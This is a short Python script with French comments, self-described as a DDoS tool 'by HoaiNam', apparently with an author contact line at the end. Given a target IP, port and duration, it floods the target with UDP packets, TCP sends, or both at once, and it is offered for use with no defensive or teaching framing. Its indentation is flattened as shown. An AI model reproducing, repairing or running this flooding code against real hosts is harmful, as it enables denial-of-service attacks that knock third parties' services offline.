import socket
import threading
import argparse

# Fonction pour afficher l'aide
def display_help():
print("Script DDOS by HoaiNam: Falcko.py <methode>")
print(" udp <ip> <port> <temps>")
print(" tcp <ip> <port> <temps>")

# Fonction pour mettre fin à l'attaque
def stop_attack():
global on
on = False

if __name__ == "__main__":
parser = argparse.ArgumentParser(description="Script DDOS by HoaiNam")
parser.add_argument("methode", choices=["udp", "tcp", "patator-ip"], help="Methode d'attaque")
parser.add_argument("ip", type=str, help="Adresse IP de la cible")
parser.add_argument("port", type=int, help="Port de la cible")
parser.add_argument("temps", type=int, help="Durée de l'attaque en secondes")

args = parser.parse_args()

on = False

# Validation des arguments
if args.methode == "udp":
print(f"UDP: {args.ip}:{args.port} {args.temps} sec")
with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp:
on = True
timer = threading.Timer(args.temps, stop_attack)
timer.start()
while on:
udp.sendto(b"DarthnetWorks", (args.ip, args.port))
elif args.methode == "tcp":
print(f"TCP: {args.ip}:{args.port} {args.temps} sec")
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp:
tcp.connect((args.ip, args.port))
on = True
timer = threading.Timer(args.temps, stop_attack)
timer.start()
while on:
tcp.send(b"DarthnetWorks")
elif args.methode == "patator-ip":
print(f"Patator-ip: {args.ip}:{args.port} {args.temps} sec")
with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp, socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp:
tcp.connect((args.ip, args.port))
on = True
timer = threading.Timer(args.temps, stop_attack)
timer.start()
while on:
udp.sendto(b"DarthnetWorks", (args.ip, args.port))
tcp.send(b"DarthnetWorks")
else:
display_help()

print("Skype : Falcko.rpz")